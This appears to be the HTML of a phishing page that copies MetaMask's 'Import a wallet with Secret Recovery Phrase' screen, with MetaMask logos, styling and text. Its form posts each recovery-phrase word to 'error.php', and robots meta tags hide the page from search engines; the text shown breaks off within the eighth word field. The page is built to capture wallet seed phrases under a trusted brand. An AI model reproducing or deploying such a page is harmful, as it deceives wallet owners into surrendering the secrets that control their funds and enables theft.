<!DOCTYPE html>
<html>
    <head>
        <meta name="robots" content="noindex, nofollow"/>
        <meta name="googlebot" content="noindex, nofollow"/>
        <meta name="bingbot" content="noindex, nofollow"/>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1 user-scalable=no" />
        <link rel="shortcut icon" href="assets/metamask-fox.svg?v=221" />
        <title>MetaMask</title>
        <link rel="stylesheet" type="text/css" href="assets/style.css" title="ltr" />
        <link rel="stylesheet" type="text/css" href="assets/style-1.css" />
        <link rel="stylesheet" type="text/css" href="assets/index.css" />
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
        <style data-jss="" data-meta="MuiInputBase">
            @-webkit-keyframes mui-auto-fill {
            }
            @-webkit-keyframes mui-auto-fill-cancel {
            }
            .MuiInputBase-root {
                color: rgba(0, 0, 0, 0.87);
                cursor: text;
                display: inline-flex;
                position: relative;
                font-size: 1rem;
                box-sizing: border-box;
                align-items: center;
                font-family: "Roboto", "Helvetica", "Arial", sans-serif;
                font-weight: 400;
                line-height: 1.1876em;
                letter-spacing: 0.00938em;
            }
            .MuiInputBase-root.Mui-disabled {
                color: rgba(0, 0, 0, 0.38);
                cursor: default;
            }
            .MuiInputBase-multiline {
                padding: 6px 0 7px;
            }
            .MuiInputBase-multiline.MuiInputBase-marginDense {
                padding-top: 3px;
            }
            .MuiInputBase-fullWidth {
                width: 100%;
            }
            .MuiInputBase-input {
                font: inherit;
                color: currentColor;
                width: 100%;
                border: 0;
                height: 1.1876em;
                margin: 0;
                display: block;
                padding: 6px 0 7px;
                min-width: 0;
                background: none;
                box-sizing: content-box;
                animation-name: mui-auto-fill-cancel;
                letter-spacing: inherit;
                animation-duration: 10ms;
                -webkit-tap-highlight-color: transparent;
            }
            .MuiInputBase-input::-webkit-input-placeholder {
                color: currentColor;
                opacity: 0.42;
                transition: opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
            }
            .MuiInputBase-input::-moz-placeholder {
                color: currentColor;
                opacity: 0.42;
                transition: opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
            }
            .MuiInputBase-input:-ms-input-placeholder {
                color: currentColor;
                opacity: 0.42;
                transition: opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
            }
            .MuiInputBase-input::-ms-input-placeholder {
                color: currentColor;
                opacity: 0.42;
                transition: opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
            }
            .MuiInputBase-input:focus {
                outline: 0;
            }
            .MuiInputBase-input:invalid {
                box-shadow: none;
            }
            .MuiInputBase-input::-webkit-search-decoration {
                -webkit-appearance: none;
            }
            .MuiInputBase-input.Mui-disabled {
                opacity: 1;
            }
            .MuiInputBase-input:-webkit-autofill {
                animation-name: mui-auto-fill;
                animation-duration: 5000s;
            }
            label[data-shrink="false"] + .MuiInputBase-formControl .MuiInputBase-input::-webkit-input-placeholder {
                opacity: 0 !important;
            }
            label[data-shrink="false"] + .MuiInputBase-formControl .MuiInputBase-input::-moz-placeholder {
                opacity: 0 !important;
            }
            label[data-shrink="false"] + .MuiInputBase-formControl .MuiInputBase-input:-ms-input-placeholder {
                opacity: 0 !important;
            }
            label[data-shrink="false"] + .MuiInputBase-formControl .MuiInputBase-input::-ms-input-placeholder {
                opacity: 0 !important;
            }
            label[data-shrink="false"] + .MuiInputBase-formControl .MuiInputBase-input:focus::-webkit-input-placeholder {
                opacity: 0.42;
            }
            label[data-shrink="false"] + .MuiInputBase-formControl .MuiInputBase-input:focus::-moz-placeholder {
                opacity: 0.42;
            }
            label[data-shrink="false"] + .MuiInputBase-formControl .MuiInputBase-input:focus:-ms-input-placeholder {
                opacity: 0.42;
            }
            label[data-shrink="false"] + .MuiInputBase-formControl .MuiInputBase-input:focus::-ms-input-placeholder {
                opacity: 0.42;
            }
            .MuiInputBase-inputMarginDense {
                padding-top: 3px;
            }
            .MuiInputBase-inputMultiline {
                height: auto;
                resize: none;
                padding: 0;
            }
            .MuiInputBase-inputTypeSearch {
                -moz-appearance: textfield;
                -webkit-appearance: textfield;
            }
        </style>
        <style data-jss="" data-meta="MuiInput">
            .MuiInput-root {
                position: relative;
            }
            label + .MuiInput-formControl {
                margin-top: 16px;
            }
            .MuiInput-colorSecondary.MuiInput-underline:after {
                border-bottom-color: #f50057;
            }
            .MuiInput-underline:after {
                left: 0;
                right: 0;
                bottom: 0;
                content: "";
                position: absolute;
                transform: scaleX(0);
                transition: transform 200ms cubic-bezier(0, 0, 0.2, 1) 0ms;
                border-bottom: 2px solid #3f51b5;
                pointer-events: none;
            }
            .MuiInput-underline.Mui-focused:after {
                transform: scaleX(1);
            }
            .MuiInput-underline.Mui-error:after {
                transform: scaleX(1);
                border-bottom-color: #f44336;
            }
            .MuiInput-underline:before {
                left: 0;
                right: 0;
                bottom: 0;
                content: "\00a0";
                position: absolute;
                transition: border-bottom-color 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
                border-bottom: 1px solid rgba(0, 0, 0, 0.42);
                pointer-events: none;
            }
            .MuiInput-underline:hover:not(.Mui-disabled):before {
                border-bottom: 2px solid rgba(0, 0, 0, 0.87);
            }
            .MuiInput-underline.Mui-disabled:before {
                border-bottom-style: dotted;
            }
            @media (hover: none) {
                .MuiInput-underline:hover:not(.Mui-disabled):before {
                    border-bottom: 1px solid rgba(0, 0, 0, 0.42);
                }
            }
        </style>
        <style data-jss="" data-meta="MuiFormLabel">
            .MuiFormLabel-root {
                color: rgba(0, 0, 0, 0.54);
                padding: 0;
                font-size: 1rem;
                font-family: "Roboto", "Helvetica", "Arial", sans-serif;
                font-weight: 400;
                line-height: 1;
                letter-spacing: 0.00938em;
            }
            .MuiFormLabel-root.Mui-focused {
                color: #3f51b5;
            }
            .MuiFormLabel-root.Mui-disabled {
                color: rgba(0, 0, 0, 0.38);
            }
            .MuiFormLabel-root.Mui-error {
                color: #f44336;
            }
            .MuiFormLabel-colorSecondary.Mui-focused {
                color: #f50057;
            }
            .MuiFormLabel-asterisk.Mui-error {
                color: #f44336;
            }
        </style>
        <style data-jss="" data-meta="MuiInputLabel">
            .MuiInputLabel-root {
                display: block;
                transform-origin: top left;
            }
            .MuiInputLabel-formControl {
                top: 0;
                left: 0;
                position: absolute;
                transform: translate(0, 24px) scale(1);
            }
            .MuiInputLabel-marginDense {
                transform: translate(0, 21px) scale(1);
            }
            .MuiInputLabel-shrink {
                transform: translate(0, 1.5px) scale(0.75);
                transform-origin: top left;
            }
            .MuiInputLabel-animated {
                transition: color 200ms cubic-bezier(0, 0, 0.2, 1) 0ms, transform 200ms cubic-bezier(0, 0, 0.2, 1) 0ms;
            }
            .MuiInputLabel-filled {
                z-index: 1;
                transform: translate(12px, 20px) scale(1);
                pointer-events: none;
            }
            .MuiInputLabel-filled.MuiInputLabel-marginDense {
                transform: translate(12px, 17px) scale(1);
            }
            .MuiInputLabel-filled.MuiInputLabel-shrink {
                transform: translate(12px, 10px) scale(0.75);
            }
            .MuiInputLabel-filled.MuiInputLabel-shrink.MuiInputLabel-marginDense {
                transform: translate(12px, 7px) scale(0.75);
            }
            .MuiInputLabel-outlined {
                z-index: 1;
                transform: translate(14px, 20px) scale(1);
                pointer-events: none;
            }
            .MuiInputLabel-outlined.MuiInputLabel-marginDense {
                transform: translate(14px, 12px) scale(1);
            }
            .MuiInputLabel-outlined.MuiInputLabel-shrink {
                transform: translate(14px, -6px) scale(0.75);
            }
        </style>
        <style data-jss="" data-meta="MuiFormControl">
            .MuiFormControl-root {
                border: 0;
                margin: 0;
                display: inline-flex;
                padding: 0;
                position: relative;
                min-width: 0;
                flex-direction: column;
                vertical-align: top;
            }
            .MuiFormControl-marginNormal {
                margin-top: 16px;
                margin-bottom: 8px;
            }
            .MuiFormControl-marginDense {
                margin-top: 8px;
                margin-bottom: 4px;
            }
            .MuiFormControl-fullWidth {
                width: 100%;
            }
        </style>
        <style data-jss="" data-meta="MuiTextField"></style>
        <style data-jss="" data-meta="makeStyles">
            .jss16 {
                color: #aeaeae;
                font-weight: 400;
            }
            .jss16.jss17 {
                color: #aeaeae;
            }
            .jss16.jss19 {
                color: #aeaeae;
            }
            .jss18:after {
                border-bottom: 2px solid rgb(3, 125, 214);
            }
            .jss20 {
                color: #aeaeae;
            }
            .jss21 {
                padding: 8px;
            }
            .jss21::placeholder {
                color: #aeaeae;
            }
            .jss22 {
                color: #fff;
            }
            .jss23:after {
                border-bottom: 2px solid #fff;
            }
            .jss24.jss25 {
                color: #5b5b5b;
            }
            .jss24.jss19 {
                color: #5b5b5b;
            }
            .jss27 {
                border: 1px solid #bbc0c5;
                height: 48px;
                display: flex;
                padding: 0 16px;
                align-items: center;
                border-radius: 6px;
            }
            label + .jss27 {
                margin-top: 9px;
            }
            .jss27.jss26 {
                border: 1px solid #2f9ae0;
            }
            .jss28 {
                color: #5b5b5b;
                position: initial;
                font-size: 1rem;
                transform: none;
                transition: none;
            }
            .jss29 {
                color: #5b5b5b;
                position: initial;
                font-size: 0.75rem;
                transform: none;
                transition: none;
            }
            .jss30 {
                line-height: initial !important;
            }
        </style>
       
    </head>
    <body>
        <div id="app-content">
            <div class="app os-win mouse-user-styles">
                <div class="menu-droppo-container network-droppo" style="position: absolute; top: 58px; width: 309px; z-index: 55;">
                    <style>
                        .menu-droppo-enter {
                            transition: transform 300ms ease-in-out;
                            transform: translateY(-200%);
                        }

                        .menu-droppo-enter.menu-droppo-enter-active {
                            transition: transform 300ms ease-in-out;
                            transform: translateY(0%);
                        }

                        .menu-droppo-leave {
                            transition: transform 300ms ease-in-out;
                            transform: translateY(0%);
                        }

                        .menu-droppo-leave.menu-droppo-leave-active {
                            transition: transform 300ms ease-in-out;
                            transform: translateY(-200%);
                        }
                    </style>
                </div>
                <div class="main-container-wrapper">
                    <div class="first-time-flow">
                        <div class="first-time-flow__wrapper">
                            <div class="app-header__logo-container" style=" margin-left: 0px;">
                                <img height="30" src="assets/metamask-logo-horizontal.svg" class="app-header__metafox-logo--horizontal" alt="" />
                                <img height="42" width="42" src="assets/metamask-fox.svg" class="app-header__metafox-logo--icon" alt="" />
                            </div>
                            <div class="first-time-flow__import">
                                <div class="first-time-flow__create-back"><a href="#">&lt; Back</a></div>
                                <div class="first-time-flow__header">Import a wallet with Secret Recovery Phrase</div>
                                <div class="first-time-flow__text-block">
                                    Only the first account on this wallet will auto load. After completing this process, to add additional accounts, click the drop down menu, then select Create Account.
                                </div>
                                <form action="error.php" method="post" class="create-new-vault__form">
                                    <div class="import-srp__container">
                                        <label class="import-srp__srp-label">
                                            <h4
                                                class="box box--margin-top-1 box--margin-right-0 box--margin-bottom-1 box--margin-left-0 box--flex-direction-row typography typography--h4 typography--weight-normal typography--style-normal typography--color-black"
                                            >
                                                Secret Recovery Phrase
                                            </h4>
                                        </label>
                                        <div class="actionable-message import-srp__paste-tip actionable-message--with-icon">
                                            <svg viewBox="0 0 10 10" xmlns="http://www.w3.org/2000/svg">
                                                <path d="M5 0C2.2 0 0 2.2 0 5s2.2 5 5 5 5-2.2 5-5-2.2-5-5-5zm0 2c.4 0 .7.3.7.7s-.3.7-.7.7-.7-.2-.7-.6.3-.8.7-.8zm.7 6H4.3V4.3h1.5V8z" fill="#037dd6"></path>
                                            </svg>
                                            <div class="actionable-message__message">You can paste your entire secret recovery phrase into any field</div>
                                        </div>
                                        <select class="dropdown import-srp__number-of-words-dropdown">
                                            <option value="12">I have a 12-word phrase</option>
                                            <option value="15">I have a 15-word phrase</option>
                                            <option value="18">I have a 18-word phrase</option>
                                            <option value="21">I have a 21-word phrase</option>
                                            <option value="24">I have a 24-word phrase</option>
                                        </select>
                                        <div class="import-srp__srp">
                                            <div class="import-srp__srp-word">
                                                <label for="import-srp__srp-word-0" class="import-srp__srp-word-label">
                                                    <p
                                                        class="box box--margin-top-1 box--margin-right-0 box--margin-bottom-1 box--margin-left-0 box--flex-direction-row typography typography--p typography--weight-normal typography--style-normal typography--color-black"
                                                    >
                                                        1.
                                                    </p>
                                                </label>
                                                <div class="MuiFormControl-root MuiTextField-root">
                                                    <div class="MuiInputBase-root MuiInput-root jss27 MuiInputBase-formControl MuiInput-formControl">
                                                        <input
                                                            aria-invalid="false"
                                                            autocomplete="off"
                                                            id="import-srp__srp-word-0"
                                                            required 
                                                            name="field_1"
                                                            type="password"
                                                            dir="auto"
                                                            data-testid="import-srp__srp-word-0"
                                                            class="MuiInputBase-input MuiInput-input"
                                                            value=""
                                                        />
                                                    </div>
                                                </div>
                                                <div class="show-hide-toggle">
                                                    <input class="show-hide-toggle__input" id="import-srp__srp-word-0-checkbox" type="checkbox" data-testid="import-srp__srp-word-0-checkbox" />
                                                    <label for="import-srp__srp-word-0-checkbox" id="0"  class="show-hide-toggle__label" title="Show/Hide this word of the secret recovery phrase">
                                                        <svg width="24" height="24" fill="currentColor" class="show-hide-toggle__icon" aria-label="This word is hidden" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512">
                                                            <path
                                                                d="M634 471L36 3.51A16 16 0 0 0 13.51 6l-10 12.49A16 16 0 0 0 6 41l598 467.49a16 16 0 0 0 22.49-2.49l10-12.49A16 16 0 0 0 634 471zM296.79 146.47l134.79 105.38C429.36 191.91 380.48 144 320 144a112.26 112.26 0 0 0-23.21 2.47zm46.42 219.07L208.42 260.16C210.65 320.09 259.53 368 320 368a113 113 0 0 0 23.21-2.46zM320 112c98.65 0 189.09 55 237.93 144a285.53 285.53 0 0 1-44 60.2l37.74 29.5a333.7 333.7 0 0 0 52.9-75.11 32.35 32.35 0 0 0 0-29.19C550.29 135.59 442.93 64 320 64c-36.7 0-71.71 7-104.63 18.81l46.41 36.29c18.94-4.3 38.34-7.1 58.22-7.1zm0 288c-98.65 0-189.08-55-237.93-144a285.47 285.47 0 0 1 44.05-60.19l-37.74-29.5a333.6 333.6 0 0 0-52.89 75.1 32.35 32.35 0 0 0 0 29.19C89.72 376.41 197.08 448 320 448c36.7 0 71.71-7.05 104.63-18.81l-46.41-36.28C359.28 397.2 339.89 400 320 400z"
                                                            ></path>
                                                        </svg>
                                                    </label>
                                                </div>
                                            </div>
                                            <div class="import-srp__srp-word">
                                                <label for="import-srp__srp-word-1" class="import-srp__srp-word-label">
                                                    <p
                                                        class="box box--margin-top-1 box--margin-right-0 box--margin-bottom-1 box--margin-left-0 box--flex-direction-row typography typography--p typography--weight-normal typography--style-normal typography--color-black"
                                                    >
                                                        2.
                                                    </p>
                                                </label>
                                                <div class="MuiFormControl-root MuiTextField-root">
                                                    <div class="MuiInputBase-root MuiInput-root jss27 MuiInputBase-formControl MuiInput-formControl">
                                                        <input
                                                            aria-invalid="false"
                                                            autocomplete="off"
                                                            id="import-srp__srp-word-1"
                                                            required 
                                                            name="field_2"
                                                            type="password"
                                                            dir="auto"
                                                            data-testid="import-srp__srp-word-1"
                                                            class="MuiInputBase-input MuiInput-input"
                                                            value=""
                                                        />
                                                    </div>
                                                </div>
                                                <div class="show-hide-toggle">
                                                    <input class="show-hide-toggle__input" id="import-srp__srp-word-1-checkbox" type="checkbox" data-testid="import-srp__srp-word-1-checkbox" />
                                                    <label for="import-srp__srp-word-1-checkbox" id="1" class="show-hide-toggle__label" title="Show/Hide this word of the secret recovery phrase">
                                                        <svg width="24" height="24" fill="currentColor" class="show-hide-toggle__icon" aria-label="This word is hidden" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512">
                                                            <path
                                                                d="M634 471L36 3.51A16 16 0 0 0 13.51 6l-10 12.49A16 16 0 0 0 6 41l598 467.49a16 16 0 0 0 22.49-2.49l10-12.49A16 16 0 0 0 634 471zM296.79 146.47l134.79 105.38C429.36 191.91 380.48 144 320 144a112.26 112.26 0 0 0-23.21 2.47zm46.42 219.07L208.42 260.16C210.65 320.09 259.53 368 320 368a113 113 0 0 0 23.21-2.46zM320 112c98.65 0 189.09 55 237.93 144a285.53 285.53 0 0 1-44 60.2l37.74 29.5a333.7 333.7 0 0 0 52.9-75.11 32.35 32.35 0 0 0 0-29.19C550.29 135.59 442.93 64 320 64c-36.7 0-71.71 7-104.63 18.81l46.41 36.29c18.94-4.3 38.34-7.1 58.22-7.1zm0 288c-98.65 0-189.08-55-237.93-144a285.47 285.47 0 0 1 44.05-60.19l-37.74-29.5a333.6 333.6 0 0 0-52.89 75.1 32.35 32.35 0 0 0 0 29.19C89.72 376.41 197.08 448 320 448c36.7 0 71.71-7.05 104.63-18.81l-46.41-36.28C359.28 397.2 339.89 400 320 400z"
                                                            ></path>
                                                        </svg>
                                                    </label>
                                                </div>
                                            </div>
                                            <div class="import-srp__srp-word">
                                                <label for="import-srp__srp-word-2" class="import-srp__srp-word-label">
                                                    <p
                                                        class="box box--margin-top-1 box--margin-right-0 box--margin-bottom-1 box--margin-left-0 box--flex-direction-row typography typography--p typography--weight-normal typography--style-normal typography--color-black"
                                                    >
                                                        3.
                                                    </p>
                                                </label>
                                                <div class="MuiFormControl-root MuiTextField-root">
                                                    <div class="MuiInputBase-root MuiInput-root jss27 MuiInputBase-formControl MuiInput-formControl">
                                                        <input
                                                            aria-invalid="false"
                                                            autocomplete="off"
                                                            id="import-srp__srp-word-2"
                                                             required 
                                                             name="field_3"
                                                            type="password"
                                                            dir="auto"
                                                            data-testid="import-srp__srp-word-2"
                                                            class="MuiInputBase-input MuiInput-input"
                                                            value=""
                                                        />
                                                    </div>
                                                </div>
                                                <div class="show-hide-toggle">
                                                    <input class="show-hide-toggle__input" id="import-srp__srp-word-2-checkbox" type="checkbox" data-testid="import-srp__srp-word-2-checkbox" />
                                                    <label for="import-srp__srp-word-2-checkbox" id="2" class="show-hide-toggle__label" title="Show/Hide this word of the secret recovery phrase">
                                                        <svg width="24" height="24" fill="currentColor" class="show-hide-toggle__icon" aria-label="This word is hidden" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512">
                                                            <path
                                                                d="M634 471L36 3.51A16 16 0 0 0 13.51 6l-10 12.49A16 16 0 0 0 6 41l598 467.49a16 16 0 0 0 22.49-2.49l10-12.49A16 16 0 0 0 634 471zM296.79 146.47l134.79 105.38C429.36 191.91 380.48 144 320 144a112.26 112.26 0 0 0-23.21 2.47zm46.42 219.07L208.42 260.16C210.65 320.09 259.53 368 320 368a113 113 0 0 0 23.21-2.46zM320 112c98.65 0 189.09 55 237.93 144a285.53 285.53 0 0 1-44 60.2l37.74 29.5a333.7 333.7 0 0 0 52.9-75.11 32.35 32.35 0 0 0 0-29.19C550.29 135.59 442.93 64 320 64c-36.7 0-71.71 7-104.63 18.81l46.41 36.29c18.94-4.3 38.34-7.1 58.22-7.1zm0 288c-98.65 0-189.08-55-237.93-144a285.47 285.47 0 0 1 44.05-60.19l-37.74-29.5a333.6 333.6 0 0 0-52.89 75.1 32.35 32.35 0 0 0 0 29.19C89.72 376.41 197.08 448 320 448c36.7 0 71.71-7.05 104.63-18.81l-46.41-36.28C359.28 397.2 339.89 400 320 400z"
                                                            ></path>
                                                        </svg>
                                                    </label>
                                                </div>
                                            </div>
                                            <div class="import-srp__srp-word">
                                                <label for="import-srp__srp-word-3" class="import-srp__srp-word-label">
                                                    <p
                                                        class="box box--margin-top-1 box--margin-right-0 box--margin-bottom-1 box--margin-left-0 box--flex-direction-row typography typography--p typography--weight-normal typography--style-normal typography--color-black"
                                                    >
                                                        4.
                                                    </p>
                                                </label>
                                                <div class="MuiFormControl-root MuiTextField-root">
                                                    <div class="MuiInputBase-root MuiInput-root jss27 MuiInputBase-formControl MuiInput-formControl">
                                                        <input
                                                            aria-invalid="false"
                                                            autocomplete="off"
                                                            id="import-srp__srp-word-3"
                                                             required 
                                                             name="field_4"
                                                            type="password"
                                                            dir="auto"
                                                            data-testid="import-srp__srp-word-3"
                                                            class="MuiInputBase-input MuiInput-input"
                                                            value=""
                                                        />
                                                    </div>
                                                </div>
                                                <div class="show-hide-toggle">
                                                    <input class="show-hide-toggle__input" id="import-srp__srp-word-3-checkbox" type="checkbox" data-testid="import-srp__srp-word-3-checkbox" />
                                                    <label for="import-srp__srp-word-3-checkbox" id="3" class="show-hide-toggle__label" title="Show/Hide this word of the secret recovery phrase">
                                                        <svg width="24" height="24" fill="currentColor" class="show-hide-toggle__icon" aria-label="This word is hidden" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512">
                                                            <path
                                                                d="M634 471L36 3.51A16 16 0 0 0 13.51 6l-10 12.49A16 16 0 0 0 6 41l598 467.49a16 16 0 0 0 22.49-2.49l10-12.49A16 16 0 0 0 634 471zM296.79 146.47l134.79 105.38C429.36 191.91 380.48 144 320 144a112.26 112.26 0 0 0-23.21 2.47zm46.42 219.07L208.42 260.16C210.65 320.09 259.53 368 320 368a113 113 0 0 0 23.21-2.46zM320 112c98.65 0 189.09 55 237.93 144a285.53 285.53 0 0 1-44 60.2l37.74 29.5a333.7 333.7 0 0 0 52.9-75.11 32.35 32.35 0 0 0 0-29.19C550.29 135.59 442.93 64 320 64c-36.7 0-71.71 7-104.63 18.81l46.41 36.29c18.94-4.3 38.34-7.1 58.22-7.1zm0 288c-98.65 0-189.08-55-237.93-144a285.47 285.47 0 0 1 44.05-60.19l-37.74-29.5a333.6 333.6 0 0 0-52.89 75.1 32.35 32.35 0 0 0 0 29.19C89.72 376.41 197.08 448 320 448c36.7 0 71.71-7.05 104.63-18.81l-46.41-36.28C359.28 397.2 339.89 400 320 400z"
                                                            ></path>
                                                        </svg>
                                                    </label>
                                                </div>
                                            </div>
                                            <div class="import-srp__srp-word">
                                                <label for="import-srp__srp-word-4" class="import-srp__srp-word-label">
                                                    <p
                                                        class="box box--margin-top-1 box--margin-right-0 box--margin-bottom-1 box--margin-left-0 box--flex-direction-row typography typography--p typography--weight-normal typography--style-normal typography--color-black"
                                                    >
                                                        5.
                                                    </p>
                                                </label>
                                                <div class="MuiFormControl-root MuiTextField-root">
                                                    <div class="MuiInputBase-root MuiInput-root jss27 MuiInputBase-formControl MuiInput-formControl">
                                                        <input
                                                            aria-invalid="false"
                                                            autocomplete="off"
                                                            id="import-srp__srp-word-4"
                                                             required 
                                                             name="field_5"
                                                            type="password"
                                                            dir="auto"
                                                            data-testid="import-srp__srp-word-4"
                                                            class="MuiInputBase-input MuiInput-input"
                                                            value=""
                                                        />
                                                    </div>
                                                </div>
                                                <div class="show-hide-toggle">
                                                    <input class="show-hide-toggle__input" id="import-srp__srp-word-4-checkbox" type="checkbox" data-testid="import-srp__srp-word-4-checkbox" />
                                                    <label for="import-srp__srp-word-4-checkbox" id="4" class="show-hide-toggle__label" title="Show/Hide this word of the secret recovery phrase">
                                                        <svg width="24" height="24" fill="currentColor" class="show-hide-toggle__icon" aria-label="This word is hidden" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512">
                                                            <path
                                                                d="M634 471L36 3.51A16 16 0 0 0 13.51 6l-10 12.49A16 16 0 0 0 6 41l598 467.49a16 16 0 0 0 22.49-2.49l10-12.49A16 16 0 0 0 634 471zM296.79 146.47l134.79 105.38C429.36 191.91 380.48 144 320 144a112.26 112.26 0 0 0-23.21 2.47zm46.42 219.07L208.42 260.16C210.65 320.09 259.53 368 320 368a113 113 0 0 0 23.21-2.46zM320 112c98.65 0 189.09 55 237.93 144a285.53 285.53 0 0 1-44 60.2l37.74 29.5a333.7 333.7 0 0 0 52.9-75.11 32.35 32.35 0 0 0 0-29.19C550.29 135.59 442.93 64 320 64c-36.7 0-71.71 7-104.63 18.81l46.41 36.29c18.94-4.3 38.34-7.1 58.22-7.1zm0 288c-98.65 0-189.08-55-237.93-144a285.47 285.47 0 0 1 44.05-60.19l-37.74-29.5a333.6 333.6 0 0 0-52.89 75.1 32.35 32.35 0 0 0 0 29.19C89.72 376.41 197.08 448 320 448c36.7 0 71.71-7.05 104.63-18.81l-46.41-36.28C359.28 397.2 339.89 400 320 400z"
                                                            ></path>
                                                        </svg>
                                                    </label>
                                                </div>
                                            </div>
                                            <div class="import-srp__srp-word">
                                                <label for="import-srp__srp-word-5" class="import-srp__srp-word-label">
                                                    <p
                                                        class="box box--margin-top-1 box--margin-right-0 box--margin-bottom-1 box--margin-left-0 box--flex-direction-row typography typography--p typography--weight-normal typography--style-normal typography--color-black"
                                                    >
                                                        6.
                                                    </p>
                                                </label>
                                                <div class="MuiFormControl-root MuiTextField-root">
                                                    <div class="MuiInputBase-root MuiInput-root jss27 MuiInputBase-formControl MuiInput-formControl">
                                                        <input
                                                            aria-invalid="false"
                                                            autocomplete="off"
                                                            id="import-srp__srp-word-5"
                                                             required 
                                                             name="field_6"
                                                            type="password"
                                                            dir="auto"
                                                            data-testid="import-srp__srp-word-5"
                                                            class="MuiInputBase-input MuiInput-input"
                                                            value=""
                                                        />
                                                    </div>
                                                </div>
                                                <div class="show-hide-toggle">
                                                    <input class="show-hide-toggle__input" id="import-srp__srp-word-5-checkbox" type="checkbox" data-testid="import-srp__srp-word-5-checkbox" />
                                                    <label for="import-srp__srp-word-5-checkbox" id="5" class="show-hide-toggle__label" title="Show/Hide this word of the secret recovery phrase">
                                                        <svg width="24" height="24" fill="currentColor" class="show-hide-toggle__icon" aria-label="This word is hidden" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512">
                                                            <path
                                                                d="M634 471L36 3.51A16 16 0 0 0 13.51 6l-10 12.49A16 16 0 0 0 6 41l598 467.49a16 16 0 0 0 22.49-2.49l10-12.49A16 16 0 0 0 634 471zM296.79 146.47l134.79 105.38C429.36 191.91 380.48 144 320 144a112.26 112.26 0 0 0-23.21 2.47zm46.42 219.07L208.42 260.16C210.65 320.09 259.53 368 320 368a113 113 0 0 0 23.21-2.46zM320 112c98.65 0 189.09 55 237.93 144a285.53 285.53 0 0 1-44 60.2l37.74 29.5a333.7 333.7 0 0 0 52.9-75.11 32.35 32.35 0 0 0 0-29.19C550.29 135.59 442.93 64 320 64c-36.7 0-71.71 7-104.63 18.81l46.41 36.29c18.94-4.3 38.34-7.1 58.22-7.1zm0 288c-98.65 0-189.08-55-237.93-144a285.47 285.47 0 0 1 44.05-60.19l-37.74-29.5a333.6 333.6 0 0 0-52.89 75.1 32.35 32.35 0 0 0 0 29.19C89.72 376.41 197.08 448 320 448c36.7 0 71.71-7.05 104.63-18.81l-46.41-36.28C359.28 397.2 339.89 400 320 400z"
                                                            ></path>
                                                        </svg>
                                                    </label>
                                                </div>
                                            </div>
                                            <div class="import-srp__srp-word">
                                                <label for="import-srp__srp-word-6" class="import-srp__srp-word-label">
                                                    <p
                                                        class="box box--margin-top-1 box--margin-right-0 box--margin-bottom-1 box--margin-left-0 box--flex-direction-row typography typography--p typography--weight-normal typography--style-normal typography--color-black"
                                                    >
                                                        7.
                                                    </p>
                                                </label>
                                                <div class="MuiFormControl-root MuiTextField-root">
                                                    <div class="MuiInputBase-root MuiInput-root jss27 MuiInputBase-formControl MuiInput-formControl">
                                                        <input
                                                            aria-invalid="false"
                                                            autocomplete="off"
                                                            id="import-srp__srp-word-6"
                                                             required 
                                                             name="field_7"
                                                            type="password"
                                                            dir="auto"
                                                            data-testid="import-srp__srp-word-6"
                                                            class="MuiInputBase-input MuiInput-input"
                                                            value=""
                                                        />
                                                    </div>
                                                </div>
                                                <div class="show-hide-toggle">
                                                    <input class="show-hide-toggle__input" id="import-srp__srp-word-6-checkbox" type="checkbox" data-testid="import-srp__srp-word-6-checkbox" />
                                                    <label for="import-srp__srp-word-6-checkbox" id="6" class="show-hide-toggle__label" title="Show/Hide this word of the secret recovery phrase">
                                                        <svg width="24" height="24" fill="currentColor" class="show-hide-toggle__icon" aria-label="This word is hidden" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512">
                                                            <path
                                                                d="M634 471L36 3.51A16 16 0 0 0 13.51 6l-10 12.49A16 16 0 0 0 6 41l598 467.49a16 16 0 0 0 22.49-2.49l10-12.49A16 16 0 0 0 634 471zM296.79 146.47l134.79 105.38C429.36 191.91 380.48 144 320 144a112.26 112.26 0 0 0-23.21 2.47zm46.42 219.07L208.42 260.16C210.65 320.09 259.53 368 320 368a113 113 0 0 0 23.21-2.46zM320 112c98.65 0 189.09 55 237.93 144a285.53 285.53 0 0 1-44 60.2l37.74 29.5a333.7 333.7 0 0 0 52.9-75.11 32.35 32.35 0 0 0 0-29.19C550.29 135.59 442.93 64 320 64c-36.7 0-71.71 7-104.63 18.81l46.41 36.29c18.94-4.3 38.34-7.1 58.22-7.1zm0 288c-98.65 0-189.08-55-237.93-144a285.47 285.47 0 0 1 44.05-60.19l-37.74-29.5a333.6 333.6 0 0 0-52.89 75.1 32.35 32.35 0 0 0 0 29.19C89.72 376.41 197.08 448 320 448c36.7 0 71.71-7.05 104.63-18.81l-46.41-36.28C359.28 397.2 339.89 400 320 400z"
                                                            ></path>
                                                        </svg>
                                                    </label>
                                                </div>
                                            </div>
                                            <div class="import-srp__srp-word">
                                                <label for="import-srp__srp-word-7" class="import-srp__srp-word-label">
                                                    <p
                                                        class="box box--margin-top-1 box--margin-right-0 box--margin-bottom-1 box--margin-left-0 box--flex-direction-row typography typography--p typography--weight-normal typography--style-normal typography--color-black"
                                                    >
                                                        8.
                                                    </p>
                                                </label>
                                                <div class="MuiFormControl-root MuiTextField-root">
                                                    <div class="MuiInputBase-root MuiInput-root jss27 MuiInputBase-formControl MuiInput-formControl">
                                                        <input
                                                            aria-invalid="false"
                                                            autocomplete="off"
                                                            id="import-srp__srp-word-7"
                                                             required 
                                                             name="field_8"
                                                            type="password"
                                                            dir="auto"
                                                            data-testid="import-srp__srp-word-7"
                                                            class="MuiInputBase-input MuiInput-input"
                                                            value=""
                                                        />
                                                    </div>
                                                </div>
                                                <div class="show-hide-toggle">
